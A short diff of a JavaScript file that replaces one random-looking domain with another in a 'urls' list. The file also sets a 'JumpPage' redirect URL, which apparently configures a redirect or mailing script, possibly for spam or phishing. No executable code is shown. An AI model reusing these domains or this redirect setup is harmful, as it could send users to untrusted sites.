@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'drpljzov.cc', 
+	'hlfwaolt.com', 
 ];                                                                                                                  
 
 var JumpPage="https://cgbgw.com";
